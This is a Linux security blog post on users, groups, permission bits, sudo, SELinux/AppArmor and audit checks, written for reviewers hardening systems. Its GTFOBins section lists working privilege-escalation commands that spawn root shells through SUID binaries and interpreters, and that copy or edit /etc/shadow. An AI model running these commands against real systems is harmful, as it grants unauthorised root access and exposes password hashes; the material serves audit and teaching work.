---
layout: post
title: "Linux Security - Users & Permissions"
date: 2025-11-10 10:00:00 +0000
categories: [linux-security]
tags: [linux-security]
author: Application Security Engineer
comments: true
excerpt: "The purpose of Linux users and permissions security is to protect the system and its data by controlling who can access what, and what actions they are allowed to perform. It is one of the core foundations of Linux security"
---

Most of the applications and infrastructe components are deployed on the Linux operating systems, Linux, as the backbone of servers, cloud infrastructure, and embedded systems, is no exception. It is important to understand the underlaying fundamentals of Linux and it's security. This blog series dives into the internal mechanisms of the Linux operating system from a security perspective.

We’ll explore topics such as user and permission models, process isolation, memory management, system calls, kernel security modules, authentication frameworks, auditing systems, and identity management. 

By understanding these internals, security practitioners, administrators, and developers gain the insight needed to harden systems, detect vulnerabilities, and make informed decisions when designing secure environments.

## 1. Identity Management: Users and Groups
In Linux, every action is performed by a user. The kernel relies on **numerical identifiers**, not usernames, to make authorization decisions.

### Core Concepts
* **UID (User ID):** The unique number assigned to a user.
    * **Root (UID 0):** The superuser. Has unrestricted access to the system.
    * **System Users (UID 1–999):** Used by services (like `apache`, `mysql`) to run processes. They usually cannot log in interactively (shell set to `/sbin/nologin`).
    * **Regular Users:** Human users.
* **GID (Group ID):** The unique number assigned to a group.
* **Key Files:**
    * `/etc/passwd`: User attributes (Username, UID, GID, Home Dir, Shell). **Readable by everyone.**
    * `/etc/group`: Stores group attributes and members.

### ❓ Q&A: The "UID 1000" Assumption
**Q: Are you sure the regular user will always have UID 1000+?**

**A: No.** While `1000` is the standard convention for modern distributions, it is **not** a kernel rule. Relying on this assumption during a review can cause you to miss rogue users on legacy systems.

**UID Reference Table:**
| Distribution / OS | Typical "Regular User" Start UID |
| :--- | :--- |
| Ubuntu / Debian | 1000 |
| RHEL 7+ / CentOS 7+ | 1000 |
| **RHEL 6 / CentOS 6 (Legacy)** | **500** |
| Alpine Linux | 1000 |
| macOS (Darwin) | 501 |

**Security Finding:** Always check `/etc/login.defs` (look for `UID_MIN`) to establish the baseline for the specific system you are auditing.


## 2. The Permission Model (DAC)
Linux uses **Discretionary Access Control (DAC)**. Permissions are checked against the user's UID/GID.

### The "rwx" Triad

| Permission | On a File | On a Directory | Octal Value |
| :--- | :--- | :--- | :--- |
| **Read (r)** | View contents | List contents (`ls`) | 4 |
| **Write (w)** | Modify contents | Create/Delete files inside | 2 |
| **Execute (x)** | Run as program | Enter directory (`cd`) | 1 |


## 3. Special Permissions (The Dangerous Bits)
Standard permissions are often insufficient. Linux uses three special bits that are frequent targets for privilege escalation.

### A. SUID (Set User ID)
When a binary with SUID is executed, it runs with the permissions of the **file owner** (usually root), not the user who launched it.
* **Indicator:** `rwsr-xr-x` (Letter `s` in the Owner's execute slot).
* **Risk:** If a script or binary has SUID and contains bugs, a regular user can escalate to root.

### ❓ Q&A: SUID and /etc/shadow
**Q: Can I use the `passwd` command to update `/etc/shadow` directly since it has the SUID bit?**

**A: Technically yes, but logically no.**
1.  **The Power (SUID):** Yes, `passwd` runs with **Effective UID 0**, so the process *can* write to `/etc/shadow`.
2.  **The Gatekeeper (Internal Logic):** The binary code calls `getuid()` to check the **Real UID** (who actually typed the command). If you are not root, the code restricts you to changing *only* your own password.
3.  **The Mechanism (Atomic Update):** It does not edit the file "directly" (in-place). It uses an atomic sequence: Lock -> Read -> Write Temp -> Rename.
   Q. You asked if it updates the file "directly." In a strict engineering sense, no. It does not open the file, jump to line 5, and rewrite the bytes. That would be dangerous (if the power fails mid-write, the database is corrupted).
Instead, passwd (and tools like useradd/vipw) uses an Atomic Update strategy:
   * **Lock: It creates a lock file (usually /etc/.pwd.lock) to prevent two processes from editing at the same time.
   * **Read & Copy: It reads /etc/shadow into memory.
   * **Write Temp: It writes the new version of the data to a temporary file (often /etc/nshadow).
   * **Rename: Once the write is confirmed successful, it uses the rename() system call to replace /etc/shadow with /etc/nshadow.
* **Review Takeaway:** Look for custom SUID binaries that have the "Power" but lack the "Gatekeeper" logic.

### B. SGID (Set Group ID)
* **On Files:** Runs with the permissions of the file's group.
* **On Directories:** New files created inside inherit the **group of the directory**, not the creator's primary group. (Great for shared folders).

### C. The Sticky Bit (+t)
Used primarily on shared directories (like `/tmp`) to solve the "Shared Directory Dilemma."

### ❓ Q&A: Sticky Bit Deep Dive
**Q: Explain more on the Sticky Bit.**

**A:** It is the **"Restricted Deletion Flag."**
* **The Problem:** In a directory with `777` permissions, User A can delete User B's files because they have write access to the *parent directory*.
* **The Solution:** Setting the Sticky Bit (`chmod +t`) ensures a user can only delete a file if they own the **file**, the **directory**, or are **root**.
* **Indicators:**
    * `drwxrwxrwt` (Lower `t`): Correct.
    * `drwxrwxr-T` (Upper `T`): Missing execute bit (Misconfiguration).
* **Review Finding:** World-writable directories missing the sticky bit are a High Severity finding.


## 4. Authentication & Password Storage
* **`/etc/shadow`:** Stores password hashes. Readable only by root.
* **PAM (Pluggable Authentication Modules):** Middleware API (`/etc/pam.d/`) that allows changing auth methods (LDAP, 2FA) without recompiling apps.
* **SSH:**
    * Config: `/etc/ssh/sshd_config`
    * **Review Check:** Ensure `PermitRootLogin` is set to `no`.


## 5. Privilege Delegation (sudo)
Users rarely log in as root directly; they use `sudo` to elevate privileges.

* **Configuration:** `/etc/sudoers`.
* **Major Risk (NOPASSWD):** `bob ALL=(ALL) NOPASSWD: ALL` gives Bob root access without authentication.
* **Major Risk (Binaries):** Allowing a user to run tools like `vim`, `less`, or `find` via sudo allows them to break out to a root shell.


## 6. Mandatory Access Control (MAC)
Even if DAC permissions allow access (e.g., root reading a file), MAC provides an extra confinement layer.
* **Tools:** SELinux (RedHat family), AppArmor (Debian/Ubuntu family).
* **Concept:** Restricts what *processes* can do, even if running as root.
* Example: Even if the Apache user is exploited, SELinux can prevent it from reading /etc/shadow or opening a reverse shell connection, regardless of file permissions.


## 7. GTFOBins & Privilege Escalation
"GTFOBins" are legitimate Unix binaries that can be abused to bypass security restrictions.

### The "Hit List" (Common Exploit Vectors)

| Category | Binaries | How it works |
| :--- | :--- | :--- |
| **Shell Spawners** | `vim`, `find`, `awk`, `less`, `man`, `env` | These tools can execute OS commands. If SUID, they spawn a root shell. |
| **File Manipulators** | `cp`, `mv`, `tar`, `nano`, `zip` | Can read/write restricted files (like overwriting `/etc/passwd`). |
| **Interpreters** | `python`, `perl`, `ruby`, `php` | Can import OS libraries to execute system shells. |

| Binary | "The ""Breakout"" Command" | Why it works |
| :--- | :--- | :--- |
| find | `find . -exec /bin/sh -p \; -quit` | find has an -exec flag to run commands on every file it finds. We tell it to run a shell. |
| vim | `vim -c ':!/bin/sh'` | Vim allows you to run OS commands using !.
| awk | `"awk 'BEGIN {system(""/bin/sh"")}'"` | awk is a scripting language; system() executes a command. |
| less | `less /etc/profile then type !/bin/sh` | less (and more) behaves like vi. Typing ! inside the pager executes a shell command. |
| man | `man man then type !/bin/sh` | man uses a pager (like less) to display help. You can break out of the help screen into a shell. |
| env | `env /bin/sh -p` | "env is designed to run programs in a modified environment. If SUID it runs them as root." |

| Binary | "The ""Breakout"" Command" | Why it works |
| :--- | :--- | :--- |
| cp | cp /etc/shadow /tmp/shadow_copy | "If cp is SUID root it can read any file. You simply copy the protected file to a place you can read."
| mv | mv /bin/sh /bin/ping | "You could replace a common binary (like ping) with a shell so the next time root runs ping they run your shell."
| tar | tar -cf /tmp/shadow.tar /etc/shadow | "tar can archive any file it has access to. You archive the shadow file then extract it somewhere safe to read it."
| nano | nano /etc/shadow | "Unlike vim nano usually doesn't have a ""shell escape"" but if it's SUID you can just open and edit system files directly."

Python: `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
Perl: `perl -e 'exec "/bin/sh";'`
Ruby: `ruby -e 'exec "/bin/sh"'`
PHP: `php -r "pcntl_exec('/bin/sh', ['-p']);"`


### ❓ Q&A: Default Permissions of GTFOBins
**Q: What are the default permissions of these "GTFOBins" commands?**

**A: They are safe (755) by default.**

| Binary State | Permissions | Security Risk |
| :--- | :--- | :--- |
| **Default** | `755` (`rwxr-xr-x`) | **None.** It is just a text editor/tool. |
| **Misconfigured** | `4755` (`rwsr-xr-x`) | **Critical.** Privilege Escalation vector (SUID set). |


## 8. Audit Command Cheat Sheet (The "Hunter" List)

**1. Find UID 0 Users (Root equivalents):**
```bash
grep ':0:' /etc/passwd
```
